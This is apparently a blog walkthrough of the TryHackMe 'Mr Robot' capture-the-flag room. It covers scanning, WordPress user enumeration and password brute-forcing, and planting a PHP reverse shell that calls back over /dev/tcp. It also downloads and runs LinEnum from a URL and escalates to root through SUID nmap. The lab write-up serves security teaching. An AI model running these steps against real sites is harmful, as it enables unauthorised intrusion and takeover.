---
title: Mr Robot
categories: [TryHackMe]
tags: [Linux, medium,]
image: images/Mr Robot/Mr Robot.png
---
**Mr. Robot** is an **medium** rated room on **TryHackMe** inspired by the Mr. Robot TV series. The challenge begins with a web server hosting a WordPress site that contains clues and vulnerabilities. By enumerating the web server, you discover hidden directories and files, leading to the extraction of sensitive information. Gaining initial access involves using cracked credentials found through wordlists and exploiting the WordPress setup.


# 1. Initial Reconnaissance and Scanning:
The first phase of any Capture The Flag (CTF) challenge is information gathering. Our goal here is to identify what services are running on the target machine and which ports are open. This intelligence sets the stage for future attacks. 
### Nmap Scan:
Use Nmap to scan the target's open ports, services, and versions:

```console
nmap -sC -sV -oN nmap_scan <Target_IP>

``` 
●`-sC:` Enables default scripts, often revealing common vulnerabilities.  
●`-sV:` Detects service/version information, such as Apache, OpenSSH, etc.  
●`-oN` nmap_scan: Saves the output into a file named nmap_scan for later reference.

### Understanding the Results:
Look for ports such as:

●**Port 80** (HTTP): Likely indicates a website is running.   
●**Port 443** (HTTPS): Secure HTTP services.   
●**Port 22** (SSH): Useful later for remote access.  

# 2. Web Enumeration :

With **port 80 (HTTP)** open, it's time to explore the website for hidden vulnerabilities or clues. This includes both manual inspection and automated enumeration of directories.

### Inspect the Website:
Visit the site at `http://<Target_IP>`. The website is themed around the **Mr. Robot** show, but stay focused on finding clues. Check the **page source** for hidden comments or links that developers might have left behind.

**robots.txt File:**
The `robots.txt` file can contain sensitive or hidden information that isn't meant for users. Access it with:

```console
curl http://<Target_IP>/robots.txt
``` 


You'll find two key pieces of information:

**●fsocity.dic:** A wordlist for brute-forcing passwords.   
**●key-1-of-3.txt:** The first flag. Retrieve it from `http://<Target_IP>/key-1-of-3.txt`.
Download both files:
```console
wget http://<Target_IP>/fsocity.dic
wget http://<Target_IP>/key-1-of-3.txt
``` 
The **fsocity.dic** file is a wordlist we will use later for brute-forcing the login credentials.

# 3. Directory Brute-Forcing
Next, we perform directory brute-forcing to uncover hidden pages or admin areas. This step can lead to further insights about the target's web structure.

### Gobuster or Dirb Scan:


```console
gobuster dir -u http://<Target_IP> -w /usr/share/wordlists/dirb/common.txt
``` 
●`u:` The target URL.
●`w:` The wordlist (in this case, common.txt).
●`t:` Number of threads to speed up the process.
The scan will reveal directories like `/wp-admin` and `/wp-login.php`, indicating the presence of **WordPress** on the machine a crucial discovery, as WordPress sites are often vulnerable.

# 4. WordPress Enumeration
Knowing that the target is running WordPress, the next step is to enumerate the WordPress installation to identify users and vulnerabilities.

### WPScan:
WPScan is a great tool for WordPress enumeration. Let's start by finding users:

```console
wpscan --url http://<Target_IP> --enumerate u
``` 

This scan will likely reveal a username like **Elliot**, named after the main character from Mr. Robot. Now you have a target for a brute-force attack.

# 5. Brute-Forcing WordPress Login
With the username **Elliot** identified, the next step is to brute-force the password using the **fsocity.dic** wordlist.

### WPScan Brute-Force:
```console
wpscan --url http://<Target_IP> --wordlist fsocity.dic --username Elliot
```
WPScan will attempt to log in with each password in the wordlist until it succeeds, eventually cracking the password.

# 6. Gaining Access Through WordPress
Once you’ve logged in as **Elliot** via `http://<Target_IP>/wp-login.php`, you have control over the WordPress site. Your next goal is to upload a **reverse shell** and gain access to the underlying system.

### Uploading a Reverse Shell:
Go to **Appearance > Theme Editor**, and select the `404.php` file. Replace its content with **Pentestmonkey’s PHP reverse shell**: [link](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 

```console
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<Your_IP>/<Your_Port> 0>&1'");
?>
```



Insert your local machine's IP address and the port you want to listen on.

# Netcat Listener:
On your machine, set up a listener with **Netcat**:

```console
nc -lvnp <Your_Port>
```

# Trigger the Reverse Shell:
Visit the following URL to execute the reverse shell:
```console
http://<Target_IP>/wp-content/themes/<theme>/404.php
```

This will establish a connection between the target and your local machine.


# 7. Privilege Escalation
Now that you have a shell, you need to escalate your privileges from a low-level user to **root**.

### System Enumeration:
Check system information and identify potential privilege escalation vectors:
```console
whoami        # Check current user
hostname      # System name
uname -a      # Kernel version
``` 
### Using LinEnum or LinPEAS:
You can automate the privilege escalation enumeration process using tools like **LinEnum** or **LinPEAS**:
```console
wget http://<URL_to_LinEnum>/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```
### Escalating with SUID Binaries:
Check for binaries with the SUID bit set (which run as root even if you're a regular user):
```console
find / -perm -u=s -type f 2>/dev/null
```
If **nmap** has the SUID bit set, you can use its interactive mode to escalate privileges:
```console
nmap --interactive
!sh
``` 
This will drop you into a root shell.


# 8. Capture the Flags
Now that you have root access, it's time to capture all three flags.

●**First Flag**: Found in the `robots.txt` file (`key-1-of-3.txt`).
●**Second Flag**: Search the home directories to find the second flag:
```console
cat /home/<username>/key-2-of-3.txt
```
●**Root Flag**: The final flag is usually located in the root directory:
```console
cat /root/key-3-of-3.txt
```






# Final Thoughts
With root access and all flags captured, you have successfully completed the **Mr. Robot** CTF challenge on TryHackMe or Vulnhub.